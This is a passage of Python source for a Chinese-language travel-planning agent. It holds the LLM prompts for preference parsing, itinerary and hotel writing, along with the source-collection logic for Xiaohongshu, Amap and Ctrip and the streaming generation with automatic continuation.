def _source_image_count(sources: list[dict]) -> int:
    return sum(len(source.get("images") or []) for source in sources if isinstance(source, dict))


def merge_refreshed_image_sources(existing: list[dict], refreshed: list[dict]) -> list[dict]:
    """把新抓的有图来源并入旧来源：同 URL 补字段，不同 URL 追加，空图不污染。"""
    merged = [dict(source) for source in existing if isinstance(source, dict)]
    by_url = {source.get("url"): source for source in merged if source.get("url")}
    for source in refreshed:
        if not isinstance(source, dict) or not (source.get("images") or []):
            continue
        url = source.get("url")
        if url and url in by_url:
            target = by_url[url]
            target["images"] = source["images"]
            target.setdefault("site", source.get("site"))
            continue
        copied = dict(source)
        merged.append(copied)
        if url:
            by_url[url] = copied
    return merged


# ---------- Prompt ----------

PREF_SYSTEM = (
    "你是旅行需求解析助手。根据对话历史和用户最新输入，抽取旅行偏好。"
    "如果用户不是在规划旅行（闲聊、问候、无关问题），is_travel_request=false。"
    "如果是旅行请求但缺少目的地这种关键信息，用 clarification 写一句反问。"
    "destination 必须是具体真实地名（城市/景区，多个用、连接）——**绝不能**填"
    "「热门目的地」「附近」「周边」这类占位词；解析不出就留空并写 clarification。"
    "若用户是在回答你上一轮的澄清问题（如你问「想去哪个」而用户答「都去」「第一个」），"
    "必须结合上一轮列出的选项解析：「都去」= 把全部选项用、连接填进 destination。"
    "**用户把选择权交给你时**（「你决定」「随便」「都行」「你安排一个热门的」「看着办」「你帮我选」），"
    "let_agent_decide=true，并**直接从上一轮你列出的候选里挑一个最合适的真实地名**填进 destination，"
    "不要再反问、更不要填占位词。用户给的是方向性约束（如「往武汉方向」「找个自然风光的」）时同理："
    "自己挑一个符合该约束的具体城市填上。"
    "intent 判定：本轮主要在问酒店/住宿=hotel；主要在要路线/行程规划/攻略=route；其他=general。"
    "wants_hotel：只要请求里包含酒店/住宿相关内容（含每晚预算），即使主意图是规划路线也为 true。"
    "**沿途中转请求**（「A 出发到 B，途中/沿途/中途/顺路有什么可以逛的」）："
    "waypoint_trip=true、origin=A、destination=B——终点 B 是明确的，**绝不要**因为"
    "中途停在哪还没定就把 destination 留空去反问「想去哪」。"
    "用户后续选定了某个中途点（如「就去太湖县吧」）：destination=该中途点、"
    "waypoint_trip=false，并把「这是 A 自驾去 B 的中途停留站」写进 special_requirements。"
) + CURRENT_REQUEST_POLICY

# 续写提示（2026-08-04）：模型很容易「重新开个头」或加一句「好的，继续」，
# 那会在正文中间插入重复内容。这里把纪律写死：接着最后一个字符往下写。
CONTINUE_GUIDE_PROMPT = (
    "你上面的攻略在长度上限处被硬截断了（可能停在半句话、半个表格行甚至半个词中间）。\n"
    "请**紧接着最后一个字符继续写**，把剩余部分补完：\n"
    "- 不要重复任何已经写过的内容，不要重新写标题或开头；\n"
    "- 不要加「好的」「继续」「接上文」这类过渡语，直接输出正文；\n"
    "- 如果截断处正好在表格中间，就从那一行的剩余单元格接着写，保持表格语法完整；\n"
    "- 按原有的结构和排版纪律写完剩下的章节。"
)

TASKPLAN_SYSTEM = (
    "你是旅行搜索任务规划助手。根据用户偏好，生成 3-6 个搜索引擎查询任务，"
    "覆盖攻略、必去景点、美食、住宿、交通。query 要像真实搜索词，包含目的地。"
    "若偏好里 waypoint_trip=true：所有查询都针对「origin 到 destination 沿途/顺路」的"
    "中途停留地（如「合肥到武汉 自驾 沿途 古镇」「合肥 武汉 中途 顺路景点」），"
    "**不要**生成 destination 城市本身的攻略/景点查询。"
) + CURRENT_REQUEST_POLICY

ITINERARY_SYSTEM = (
    "你是资深旅行规划师。根据用户偏好和多个来源的资料，生成一份**详尽具体**的图文攻略。"
    "用 Markdown 输出，包含：\n"
    "1. 一个简洁的 # 标题；紧接一段 `> **行程速览**：...`，用一两句话说清主线、节奏和亮点\n"
    "2. 每日行程（## Day 1 / Day 2...，每天上午/下午/晚上；每个时段给出具体地点、"
    "建议停留时长、时段间交通方式与耗时、涉及花费的写人均参考价；安排相近区域避免绕路）\n"
    "3. 必吃美食清单\n"
    "4. 住宿推荐：若参考资料中含「携程实时酒店列表」，按用户预算从中选 2-3 家"
    "真实酒店（名称/位置/评分，有价格才写价格），说明选择理由；"
    "无酒店资料则直接按区域给住宿建议，不编造酒店名，"
    "也**不要向用户解释「本轮资料不含酒店列表」这类内部原因**（用户不关心系统抓了什么）\n"
    "5. 预算估算表（酒店/餐饮/交通/门票/其他，给出合计）\n"
    "6. 避坑提示\n"
    "排版纪律：每个 Day 标题后先写一行 `**今日路线**：A → B → C`；核心安排优先用"
    "「时段｜地点与体验｜交通与停留｜参考花费」四列表格表达，表格后最多保留 3-5 条真正重要的"
    "预约/点单/装备提示。不要在一个项目符号下再嵌套四五层编号，不要反复写“具体地点/停留时长/"
    "行程要点”等标签；相同信息只出现一次。美食、住宿、预算各用一个独立 ## 章节。"
    "轻松节奏就少安排景点、多留休息。只用资料里出现的真实地点，不编造。"
    "若资料含「小红书」笔记：**优先采信并织入其中的真实体验细节**——具体店名与点单推荐、"
    "人均价格、排队/预约提示、拍照机位、避坑经验，写进对应天的行程与美食清单里，"
    "宁可篇幅长一些也不要写成泛泛的百科式介绍。"
    "若资料含「高德地图实时数据」：行程安排要参考天气预报（雨天优先室内/备雨具提示），"
    "景点先后顺序参考坐标就近原则，避免来回绕路。"
    "若提供了「可插入的图片」清单，在相关 Day/景点/酒店段落后用 [[img:名称]] 插入配图，"
    "名称照抄清单、不要写网址；图片要分散到不同章节，有 3 张以上时至少使用 3 张。"
    "结尾用「## 参考来源」列出用到的来源标题。"
) + EXTERNAL_POLICY + HEALTH_POLICY + CURRENT_REQUEST_POLICY

HOTEL_SYSTEM = (
    "你是资深酒店预订顾问。根据用户偏好和来源资料，用 Markdown 输出酒店推荐：\n"
    "1. 开头一句话说明推荐思路（位置、预算的权衡）\n"
    "2. 推荐 3-6 家酒店（### 酒店名），每家给出：大致位置/商圈、参考价位、"
    "优点、缺点或注意点、适合什么样的旅行者\n"
    "3. 最后给一段「怎么选」的建议\n"
    "只用资料里出现的真实酒店和价格，不编造；资料不足时如实说明，"
    "并按区域/预算给出通用选择建议。\n"
    "预算纪律（批5）：用户给了预算就当硬约束——预算内的正常推荐；确实缺预算内好选择时，"
    "单列一个「## 上浮备选」小节放超预算的并注明各超出约多少，不要把超预算的混进正常推荐里。"
    "若提供了「可插入的图片」清单，在对应酒店（### 酒店名）段落后用 [[img:名称]] 插入配图，"
    "名称照抄清单、不要写网址。"
    "结尾用「## 参考来源」列出用到的来源标题。"
) + EXTERNAL_POLICY + HEALTH_POLICY + CURRENT_REQUEST_POLICY


# ---------- 主流程步骤（被 LangGraph 节点复用，Phase 14） ----------

def _recent_plan_prefix(cid: str, user_id: str) -> str:
    """最近规划提示（跨会话指代消解）。任何失败都返回空串——它是增强，不能挡住主流程。"""
    if not user_id:
        return ""
    try:
        from app.agent.memory import recent_plan_hint

        with get_session() as db:
            hint = recent_plan_hint(db, user_id, exclude_cid=cid)
        return f"{hint}\n\n" if hint else ""
    except Exception:  # noqa: BLE001
        logger.warning("recent plan hint failed", exc_info=True)
        return ""


def parse_request(cid: str, user_text: str, user_id: str) -> dict:
    """解析需求。返回 {route, pref?, intent?, hotel_needed?}；
    route: chat/clarify（已直接回复，图应结束）/ plan（继续规划）。"""
    llm = get_llm()
    _progress(cid, "正在理解你的旅行需求…")
    history = _history_text(cid)
    mem_pref = gather_context(cid, "", user_id, user_text=user_text)
    mem_prefix = f"{mem_pref['block']}\n\n" if mem_pref["block"] else ""
    # 跨会话指代消解（2026-07-31，取代 trip_state 记忆）：新对话里说「帮我加一天」
    # 而不报地名时，让解析能接上最近一次规划。只在这里注入——destination 是本节点的产物。
    mem_prefix += _recent_plan_prefix(cid, user_id)
    # 停止检查点（2026-07-31）：解析是一次同步阻塞的 LLM 调用，此前完全没有取消点——
    # 用户在解析阶段点停止要干等它返回（线上实测 27 秒）。这是 budget/poster 同款问题的
    # 第三处，全链路补齐。解析本身不便中途放弃（后续节点都依赖 pref），所以只在调用前后查。
    from app.agent.cancel import check as _cancel_check_parse

    _cancel_check_parse(cid)
    try:
        pref = llm.parse(
            f"{mem_prefix}对话历史：\n{history}\n\n用户最新输入：{user_text}",
            Preference, model=settings.model_planner, system=PREF_SYSTEM,
        )
    except Exception as e:  # noqa: BLE001
        _cancel_check_parse(cid)  # 停止导致的失败不该显示成「没听懂」
        _add_message(cid, "assistant", f"抱歉，我没太理解你的需求，可以再说一遍吗？（{e}）")
        return {"route": "chat"}
    _cancel_check_parse(cid)  # 解析期间点的停止在这里立即生效，不再往下跑采集

    if not pref.is_travel_request:
        reply, reasoning = llm.generate_with_reasoning(
            f"{mem_prefix}对话历史：\n{history}\n\n用户：{user_text}\n\n以旅行助手身份自然回应。",
            model=settings.model_classifier,
        )
        _add_message(cid, "assistant", reply, reasoning=reasoning)
        return {"route": "chat"}

    # 占位词归一 + 空目的地强制反问（Phase 59.2 确定性护栏）：
    # 「都去」这类澄清回答曾被解析成空目的地/「热门目的地」占位词 → 高德小红书静默跳过、
    # 必应拿占位词搜出一堆游戏官网垃圾（踩坑）。规划必须有真实目的地，否则一律反问。
    # Phase 68 三级降级：授权代选 → 追问熔断强制代选 → 才反问。
    # 此前只有「空目的地即反问」一条路，用户说「你安排一个热门的」也照样被无限追问（踩坑）。
    pref.destination = _normalize_destination(pref.destination)
    if not pref.destination:
        rounds = _recent_clarify_rounds(cid)
        forced = pref.let_agent_decide or rounds >= settings.clarify_max_rounds
        picked = _decide_destination(llm, history, user_text) if forced else ""
        if picked:
            pref.destination = picked
            # 让生成端知道这是代选，开头要说明并给用户改的余地（pref 整体会序列化进 prompt）
            pref.special_requirements = list(pref.special_requirements) + [
                f"用户没有指定具体目的地，由你代选了「{picked}」。"
                f"请在开头用一句话说明这是代为挑选的，并告诉用户不合适可以随时换。"
            ]
            logger.info("clarify fallback picked destination=%s (rounds=%d, explicit=%s)",
                        picked, rounds, pref.let_agent_decide)
        else:
            # Phase 76：先给候选，别反问。
            # 08-04 真实数据：3/8 的首问是「合肥周边」「皖南」这种区域型表达——这恰恰是
            # 「我想出去玩但不知道去哪」，是产品最该发挥价值的场景，原来却被打回去要求
            # 用户先自己选个城市。给候选既省一轮，又把「帮我选」摆进第一次接触里。
            cands = _suggest_destinations(llm, history, user_text)
            if len(cands) >= 2:
                lead = "帮你圈了几个合适的方向，点一个我就开始排行程："
                _add_message(cid, "assistant", lead, meta={"candidates": cands})
                logger.info("clarify -> candidates=%s", [c["name"] for c in cands])
                return {"route": "clarify"}

            ask = pref.clarification or (
                "想去哪里呢？告诉我具体目的地（一个或多个都行，比如「黄山」或"
                "「黄山、庐山」），我就开始规划～")
            # 已问过一次还没定 → 明确给出「交给我」这条出路，避免用户不知道可以授权
            if rounds >= 1 and "你定" not in ask:
                ask += "　也可以直接说「你定」，我来挑一个。"
            _add_message(cid, "assistant", ask)
            return {"route": "clarify"}

    intent = resolve_intent(pref.intent, user_text)
    hotel_needed = intent == "hotel" or resolve_wants_hotel(pref.wants_hotel, user_text)
    # history 存进 state（Phase 16：近 5 轮）
    return {"route": "plan", "pref": pref, "intent": intent, "hotel_needed": hotel_needed, "history": history}


async def collect_sources(
    cid: str, pref: Preference, intent: str, hotel_needed: bool, user_id: str,
    user_text: str = "",
) -> tuple[list[dict], bool]:
    """采集来源。返回 (sources, is_revision)。sources 为空表示没抓到料。"""
    existing_sources, last_dest = _last_sources_and_dest(cid)
    same_dest = bool(last_dest) and bool(pref.destination) and last_dest == pref.destination
    # 沿途中转轮不复用旧来源：destination 同为终点城市时 decide_revision 会判「复用」，
    # 但上一轮抓的是终点城市攻略，对「沿途停哪」毫无帮助（线上踩坑）。强制重新采集。
    is_revision = (not pref.waypoint_trip) and decide_revision(
        existing_sources, last_dest, pref.destination, intent, wants_hotel=hotel_needed,
    )
    if is_revision:
        if (
            intent != "hotel"
            and wants_image_refresh(user_text)
            and _source_image_count(existing_sources) < 3
        ):
            _progress(cid, "旧资料没有可用配图，正在刷新小红书图片…")
            refreshed = await _collect_xhs(cid, pref)
            merged = merge_refreshed_image_sources(existing_sources, refreshed)
            if _source_image_count(merged) > _source_image_count(existing_sources):
                _progress(cid, f"已补充 {_source_image_count(merged)} 张图片，正在重新排版…")
                return merged, True
            _progress(cid, "暂时没有抓到可用图片，先按已有资料优化排版")
        _progress(cid, "基于已有资料重新规划（无需重新搜索）…")
        return existing_sources, True

    site_sources: list[dict] = await _collect_amap(cid, pref)  # 多城逐城，可能多条
    # Phase 59：攻略/路线/美食来源优先小红书（纯 HTTP MCP，无需浏览器，先于浏览器会话跑）。
    # 拿到足够笔记 → 必应轻量化（1 查询 4 抓取），整轮明显提速；失败/未启用 → 必应全量兜底。
    xhs_sources: list[dict] = []
    reused = False
    if intent != "hotel":
        xhs_sources, reuse_note = reuse_recent_xhs_sources(cid, pref, user_id, user_text)
        if xhs_sources:
            reused = True
            _progress(cid, f"♻️ {reuse_note}")
        else:
            xhs_sources = await _collect_xhs(cid, pref)
        site_sources += xhs_sources
    search_mode = _web_search_mode(len(xhs_sources))
    # 复用的资料是**上次那个问法**抓的，本轮角度可能不同 → 必应最多降到 light，不允许 skip。
    # 多花 ~30s 换角度覆盖，相对省下的 3.5 分钟仍是大赚。
    if reused and search_mode == "skip":
        search_mode = "light"
    # 小红书资料足够 + 不需要携程酒店 → 完全不用开浏览器（跳过整个浏览器会话，最大提速）
    need_browser = hotel_needed or search_mode != "skip" or (
        intent != "hotel" and settings.site_routing_enabled and settings.xhs_enabled
    )
    if search_mode == "skip":
        _progress(cid, "小红书资料充足，跳过网页搜索")
    await _expire_stale_logins(cid, user_id)  # 建浏览器会话前做（可能重启 Chrome）
    web_sources: list[dict] = []
    if need_browser:
        try:
            async with ChromeMCP(user_id=user_id, on_queue=_queue_cb(cid)) as chrome:
                browser = BrowserTool(chrome=chrome)
                if hotel_needed:
                    site_sources += await _collect_from_routed_site(cid, pref, "hotel", browser, user_id, user_text)
                if intent != "hotel":
                    site_sources += await _collect_from_routed_site(cid, pref, intent, browser, user_id, user_text)
                if search_mode != "skip":
                    web_sources = await _search_and_collect(
                        cid, pref, intent, browser, user_id, light=search_mode == "light",
                    )
        except MCPConnectionError as e:
            _progress(cid, f"浏览器连接失败：{e}")
    sources = site_sources + web_sources
    if same_dest:
        seen_urls = {s.get("url") for s in sources}
        sources += [s for s in existing_sources if s.get("url") not in seen_urls]
    return sources, False


async def research_more(cid: str, pref: Preference, queries: list[str], user_id: str = "") -> list[dict]:
    """针对自检提出的缺口补搜一轮（Phase 14 research 节点用）。"""
    if not queries:
        return []
    _progress(cid, f"正在补充资料：{('、'.join(queries))[:40]}…")
    extra: list[dict] = []
    try:
        async with ChromeMCP(user_id=user_id, on_queue=_queue_cb(cid)) as chrome:
            browser = BrowserTool(chrome=chrome)
            extra = await _search_and_collect_queries(cid, pref, queries[:3], browser)
    except Exception:  # noqa: BLE001
        logger.warning("research_more failed", exc_info=True)
    return extra


def generate_guide_streaming(
    cid: str, user_text: str, pref: Preference, intent: str,
    sources: list[dict], user_id: str, msg_id: str | None = None, feedback: str = "",
    _retry: bool = False,
) -> tuple[str, str, str, dict]:
    """流式生成攻略到某条消息（不终稿）。返回 (guide, reasoning, msg_id, mem_ctx)。

    msg_id 为空时新建一条 streaming 消息；循环重写时复用同一条。
    feedback 非空时把上一版问题作为改进要求注入 prompt（rewrite 用）。
    """
    import time as _time

    llm = get_llm()
    mem_ctx = gather_context(cid, pref.destination, user_id, user_text=user_text)
    image_map, img_block = _build_image_context(sources)
    # Phase 31：标准 agent 轨迹（system → 交替历史 → user → assistant.tool_calls → tool×N），
    # 来源以 tool 角色 + <external_content> 标签注入，取代拼一坨 user 文本
    # 批5：酒店/交通实时类需求无日期时注入「参考价 + 追问日期」纪律，有日期则标查询日期+来源
    # Phase 58 KV 友好：system 保持静态（吃 DeepSeek 前缀缓存）；每轮会变的 directive 末置到 user
    from app.agent.realtime_guard import credibility_directive

    base_sys = HOTEL_SYSTEM if intent == "hotel" else ITINERARY_SYSTEM
    directive = credibility_directive(user_text, context=_history_text(cid))
    wp = _waypoint_directive(pref)
    if wp:
        directive = f"{directive}\n\n{wp}" if directive else wp
    messages = build_guide_messages(
        base_sys,
        cid, user_text, pref.model_dump_json(), mem_ctx["block"],
        sources, img_block=img_block, feedback=feedback, extra_user=directive,
    )
    from app.agent.cancel import TurnCancelled, is_cancelled

    if msg_id is None:
        msg_id = _add_streaming_message(cid)
    content_parts: list[str] = []
    reasoning_parts: list[str] = []
    last_flush = _time.monotonic()

    def _stream_into(msgs: list[dict]) -> bool:
        """把一次流式生成累积进 content_parts。返回是否因 max_tokens 被截断。"""
        nonlocal last_flush
        hit_limit = False
        for kind, delta in llm.stream_generate_with_reasoning(
            messages=msgs, model=settings.model_planner,
            max_tokens=settings.guide_max_tokens,
        ):
            if kind == "finish":  # P0：末块信号，别当正文追加
                hit_limit = delta == "length"
                continue
            (reasoning_parts if kind == "reasoning" else content_parts).append(delta)
            # 停止按钮（Phase 16）：命中取消 → 把已生成部分终稿标注后中止本轮
            if is_cancelled(cid):
                partial = _embed_images("".join(content_parts), image_map)
                _finalize_streaming_message(
                    msg_id, (partial + "\n\n_（已停止生成）_") if partial else "已停止本轮。",
                    "".join(reasoning_parts), meta={},
                )
                raise TurnCancelled()
            if _time.monotonic() - last_flush > 1.2:
                _update_streaming_message(
                    msg_id, _embed_images("".join(content_parts), image_map, streaming=True),
                    "".join(reasoning_parts),
                )
                last_flush = _time.monotonic()
        return hit_limit

    truncated = _stream_into(messages)
    # 触到长度上限 → **自动续写**，而不是给用户一句「已截断，可要我分段生成」就完事
    # （2026-08-04 用户反馈：多城长攻略被从「**人均（含」这种半句处切断）。
    # 续写把已生成正文作为 assistant 轮回传，要求接着最后一个字往下写。
    for _ in range(settings.guide_max_continuations):
        if not truncated:
            break
        _progress(cid, "攻略较长，正在续写剩余部分…")
        truncated = _stream_into(messages + [
            {"role": "assistant", "content": "".join(content_parts)},
            {"role": "user", "content": CONTINUE_GUIDE_PROMPT},
        ])
    raw = "".join(content_parts)
    guide = _embed_images(raw, image_map)
    # 确定性防线：模型整段输出工具调用标记（复杂多城时会犯）→ 剥离后为空。
    # 不能把空/垃圾终稿给用户：带明确反馈重试一次；仍失败则给可操作的失败说明。
    if raw.strip() and len(guide.strip()) < 50:
        if not _retry:
            logger.warning("guide output was tool-call markup, retrying once (cid=%s)", cid)
            return generate_guide_streaming(
                cid, user_text, pref, intent, sources, user_id, msg_id=msg_id,
                feedback="你上一版输出的是工具调用/DSML 标记而不是攻略正文，已被系统丢弃。"
                         "你无法调用任何工具，请只输出 Markdown 攻略正文。",
                _retry=True,
            )
        guide = ("这轮生成出了问题（模型输出了非正文内容，已拦截）。请重发一次；"
                 "如果是多城市长途行程，建议打开「深度推理」再问，或拆成单个城市分别规划。")
    if truncated and guide:  # 续写多轮后仍未写完（极长多城行程）才提示
        guide += ("\n\n---\n> ⚠️ 这份行程特别长，续写几轮后仍未写完。"
                  "可以让我「只详细展开某几天」，或拆成两段分别规划。")
    return guide, "".join(reasoning_parts), msg_id, mem_ctx


def _index_conversation(cid: str, destination: str, msg_id: str) -> None:
    """落跨会话检索索引（2026-07-31）：会话级 destination + 首条攻略消息 id。

    destination 每次终稿都刷新（多轮改目的地时以最新为准）；guide_message_id 只写一次
    ——「哪条是真攻略」在这里是**已知事实**，比读时启发式（跳过流式/海报/过短）准。
    索引写失败绝不能影响终稿，只 warn。
    """
    dest = (destination or "").strip()
    if not dest:
        return
    try:
        from app.db.models import TravelConversation

        with get_session() as db:
            conv = db.get(TravelConversation, cid)
            if conv is None:
                return
            conv.destination = dest[:64]
            if not conv.guide_message_id:
                conv.guide_message_id = msg_id
            db.commit()
    except Exception:  # noqa: BLE001
        logger.warning("index conversation failed cid=%s", cid, exc_info=True)


def finalize_guide(
    cid: str, user_text: str, pref: Preference, sources: list[dict],
    guide: str, reasoning: str, msg_id: str, mem_ctx: dict, user_id: str,
) -> None:
    """终稿：记忆提炼 + 写入最终 meta + 落跨会话检索索引。"""
    saved = extract_and_save(cid, user_text, guide, user_id)
    update_history_summary(cid)  # Phase 30：轮末折叠早期轮次
    _index_conversation(cid, pref.destination, msg_id)
    _finalize_streaming_message(
        msg_id, guide, reasoning,
        meta={
            "sources": sources,
            "preference": pref.model_dump(),
            "memories_used": mem_ctx.get("used", []),
            "memories_saved": saved,
        },
    )
    clear_plain_progress(cid)  # 清掉「搜索/读取/补搜/重排」等临时叙述，只留干净攻略


# 「住/酒店/度假村/民宿/几晚」这类词紧邻某个城市名时，说明用户在意的是**那一城**的住宿
_STAY_WORDS = ("住", "酒店", "宾馆", "民宿", "客栈", "度假村", "度假酒店", "旅馆", "晚", "过夜", "hotel")


def rank_cities_by_stay_intent(cities: list[str], user_text: str, pref: Preference) -> list[str]:
    """按「用户在哪座城市表达了住宿意图」重排（纯函数，无 LLM 调用）。

    2026-08-01：携程逐城抓取有 `ctrip_hotel_max_cities` 上限，原来按目的地串的**字面
    顺序**取前 N——而那个顺序只是模型列城市时的偶然排列。用户说「主要想在仙本那住
    度假酒店」，仙本那却可能排在被砍掉的位置。这里把明确表达住宿意图的城市提前，
    其余保持原序（稳定排序，单城/无意图时行为完全不变）。
    """
    hay = " ".join([user_text or "", *(pref.special_requirements or [])])
    if not hay.strip():
        return cities

    def score(city: str) -> int:
        best = 0
        start = 0
        while (i := hay.find(city, start)) >= 0:
            # 城市名前后各取一小段窗口，看有没有住宿类词紧邻
            window = hay[max(0, i - 12):i + len(city) + 12]
            if any(w in window for w in _STAY_WORDS):
                best = 1
                break
            start = i + len(city)
        return best

    return sorted(cities, key=lambda c: -score(c))  # Python sort 稳定，同分保持原序


async def _collect_from_routed_site(
    cid: str, pref: Preference, intent: str, browser: BrowserTool, user_id: str = "",
    user_text: str = "",
) -> list[dict]:
    """站点路由抓取：酒店 → 携程；路线/攻略 → 小红书。复用全轮共享的浏览器会话。

    携程城市 ID 三级解析：静态表 → DB 缓存 → 页面动态解析。
    登录墙时向对话流写 handoff 卡片消息，等用户手动登录；
    任何失败/超时都返回 []，由公开搜索兜底，不阻塞整体流程。
    """
    if not settings.site_routing_enabled:
        return []
    from app.agent.cancel import TurnCancelled

    site_name = "站点"
    try:
        if intent == "hotel":
            # 多城行程：destination 可能是「武汉、开封、洛阳、西安」整串——拆开逐城定位，
            # 整串当一个城市名查携程必然失败（踩坑）。上限 N 城防止整轮被酒店抓取拖太长。
            cities = site_router.split_cities(pref.destination)
            if not cities:
                return []
            site_name = "携程"
            _progress(cid, "检测到酒店需求，正在打开携程…")
            cities = rank_cities_by_stay_intent(cities, user_text, pref)
            capped = cities[:settings.ctrip_hotel_max_cities]
            if len(cities) > len(capped):
                _progress(cid, f"多城行程：先查前 {len(capped)} 城（{'、'.join(capped)}）的携程实价，"
                               "其余城市用公开搜索补充")
            results: list[dict] = []
            for dest in capped:
                city_id = site_router.lookup_ctrip_city_id(dest)
                if city_id is None:
                    _progress(cid, f"正在携程定位「{dest}」…")
                    city_id = await browser.resolve_ctrip_city(dest)
                    if city_id is None:
                        _progress(cid, f"携程暂无法定位「{dest}」，该城改用公开搜索来源")
                        continue
                    site_router.remember_ctrip_city_id(dest, city_id)
                target = site_router.ctrip_target(city_id)
                results += await _collect_with(cid, pref, target, browser, user_id, dest=dest)
            return results

        target = route_for_intent(intent, pref.destination)
        if target is None:
            return []
        site_name = target.name
        _progress(cid, f"检测到路线规划需求，正在打开{target.name}…")
        return await _collect_with(cid, pref, target, browser, user_id)
    except TurnCancelled:
        raise  # 停止按钮：TurnCancelled 是 Exception 子类，必须在广捕获前放行
    except MCPConnectionError as e:
        _progress(cid, f"浏览器暂时不可用（{str(e)[:60]}），改用公开搜索来源")
        return []
    except Exception:  # noqa: BLE001 — 站点路由失败不阻塞主流程
        logger.warning("site routing (%s) failed", intent, exc_info=True)
        _progress(cid, f"{site_name}抓取失败，改用公开搜索来源")
        return []


def _xhs_query_plan(pref: Preference) -> list[tuple[str, int]]:
    """小红书查询计划 [(query, 取几篇)]（纯函数可测）。

    单城：1 个查询取 xhs_notes_per_turn 篇；多城（destination 是「武汉、开封…」整串）：
    **逐城各 1 个查询、各 1 篇**（最多 3 城）——整串当一个关键词搜，命中质量差（踩坑）。
    """
    from app.agent.site_router import split_cities

    cities = split_cities(pref.destination)
    if not cities:
        return []
    interests = " " + " ".join(pref.interests[:2]) if pref.interests else ""
    # 沿途中转轮（2026-07-31）：搜「A到B 沿途」而不是终点城市攻略——否则整轮来源全是
    # 终点城市内容，生成端只能写成终点攻略（线上踩坑：合肥→武汉问途经，答了武汉+咸宁）。
    if pref.waypoint_trip and pref.origin and len(cities) == 1:
        extra = " ".join(pref.interests[:2]) if pref.interests else "古镇 景点"
        return [(f"{pref.origin}到{cities[0]} 自驾 沿途 {extra}", settings.xhs_notes_per_turn)]
    if len(cities) == 1:
        return [(f"{cities[0]} 旅游攻略{interests}", settings.xhs_notes_per_turn)]
    return [(f"{c} 旅游攻略{interests}", settings.xhs_notes_per_city) for c in cities[:3]]


_FRESH_SEARCH_RE = re.compile(r"重新(搜索|查|搜)|重搜|刷新资料|最新资料|再查一遍|换新的资料")


def wants_fresh_search(user_text: str) -> bool:
    """用户明确要求重新查资料（纯函数）→ 本轮不复用跨会话来源。"""
    return bool(_FRESH_SEARCH_RE.search(user_text or ""))


def reuse_recent_xhs_sources(
    cid: str, pref: Preference, user_id: str, user_text: str = ""
) -> tuple[list[dict], str]:
    """跨会话复用最近同目的地会话的小红书来源（2026-07-31）。返回 (sources, 进度文案)。

    只复用 `site == "xhs"` 的正文，实测依据（docs/task_plans/跨会话历史检索索引-2026-07-31.md）：
      · 小红书笔记正文（玩法/店名/避坑）半衰期以周计 → 复用（这是最贵的一步）；
      · 小红书图片 URL 有效期 24h（20h→200 / 39h→403）→ 超 `xhs_reuse_image_max_hours`
        清空 images，否则整版破图；
      · 高德天气是逐日预报必须重取（秒级零成本），高德 POI 图不过期但重取也便宜 → 不复用；
      · 携程酒店价格/房态实时 → 绝不复用。

    不复用的情形：功能关闭 / 沿途中转轮（语料是「A到B沿途」，与终点城市攻略不是一回事）/
    用户明确要求重新搜索 / 无目的地 / 没有命中窗口内的同城会话。
    """
    if not settings.xhs_reuse_enabled or not user_id or pref.waypoint_trip:
        return [], ""
    if wants_fresh_search(user_text):
        return [], ""
    from datetime import timedelta

    from app.agent.memory import age_delta
    from app.agent.site_router import split_cities
    from app.db.models import TravelConversation

    want = set(split_cities(pref.destination))
    if not want:
        return [], ""
    try:
        with get_session() as db:
            rows = db.execute(
                select(
                    TravelConversation.id,
                    TravelConversation.destination,
                    TravelConversation.guide_message_id,
                    TravelConversation.updated_at,
                )
                .where(
                    TravelConversation.user_id == user_id,
                    TravelConversation.id != cid,
                    TravelConversation.destination.isnot(None),
                    TravelConversation.destination != "",
                    TravelConversation.guide_message_id.isnot(None),
                )
                .order_by(TravelConversation.updated_at.desc())
                .limit(20)
            ).all()
            hit = next((r for r in rows if want & set(split_cities(r.destination))), None)
            if hit is None:
                return [], ""
            msg = db.get(TravelMessage, hit.guide_message_id)
            if msg is None:
                return [], ""
            # 年龄看**攻略消息**的 created_at，不是会话的 updated_at——后者有 onupdate，
            # 会话里任何后续活动（改标题/折叠摘要/继续聊）都会把它刷新成「刚刚」，
            # 那样 3 天前抓的图会被当成新鲜的，直接满屏 403。
            delta = age_delta(msg.created_at)
            if delta is None or delta > timedelta(days=settings.xhs_reuse_max_days):
                return [], ""
            meta = json.loads(msg.meta_json) if msg.meta_json else {}
    except Exception:  # noqa: BLE001 — 复用是提速增强，失败一律照常重新抓取
        logger.warning("reuse recent xhs failed cid=%s", cid, exc_info=True)
        return [], ""

    sources = [dict(s) for s in (meta.get("sources") or []) if s.get("site") == "xhs"]
    if not sources:
        return [], ""
    images_expired = delta > timedelta(hours=settings.xhs_reuse_image_max_hours)
    if images_expired:
        for s in sources:
            s["images"] = []  # URL 已失效，留着只会满屏破图
    age = "今天" if delta.days == 0 else f"{delta.days} 天前"
    titles = "、".join(s["title"][4:20] for s in sources[:3])
    note = (
        f"复用了{age}查过的 {len(sources)} 篇小红书资料（{titles}），跳过重新抓取"
        f"{'；配图已过期会重新配' if images_expired else ''}。"
        "想要最新资料，回一句「重新搜索」即可。"
    )
    return sources, note


async def _collect_xhs(cid: str, pref: Preference) -> list[dict]:
    """小红书笔记来源（Phase 59）：MCP 搜索 + 取详情。未启用/失败返回 []，回退必应全量。"""
    from app.tools import xhs_mcp

    if not xhs_mcp.enabled() or not pref.destination:
        return []
    sources: list[dict] = []
    for query, limit in _xhs_query_plan(pref):
        _progress(cid, f"📕 正在小红书搜索：{query[:30]}")
        # 逐篇播进度：每篇详情 ~20s，静止的「当前动作」会被当成卡死（走查 P1-2）
        def _on_note(i: int, total: int, title: str) -> None:
            _progress(cid, f"📕 正在读第 {i} 篇小红书笔记{f'：《{title}》' if title else ''}")
        try:
            sources += await xhs_mcp.collect_xhs_sources(query, limit=limit, on_note=_on_note)
        except Exception:  # noqa: BLE001
            logger.warning("xhs collect failed for %r", query, exc_info=True)
    if sources:
        _progress(cid, f"已获取 {len(sources)} 篇小红书笔记（{'、'.join(s['title'][4:20] for s in sources[:3])}）")
    else:
        _progress(cid, "小红书暂不可用，改用网页搜索")
    return sources


async def _collect_amap(cid: str, pref: Preference) -> list[dict]:
    """高德结构化数据来源（Phase 10）。未配置/失败返回 []，不影响主流程。

    2026-08-01 全量扫描修复：原来把 `pref.destination` 整串丢给 `build_amap_source`，
    多城行程（「吉隆坡、仙本那、亚庇」）geocode 必然失败 → **整条高德数据静默丢失**
    （天气预报 + 景点坐标全没有，攻略只能凭模型参数知识写）。实测：
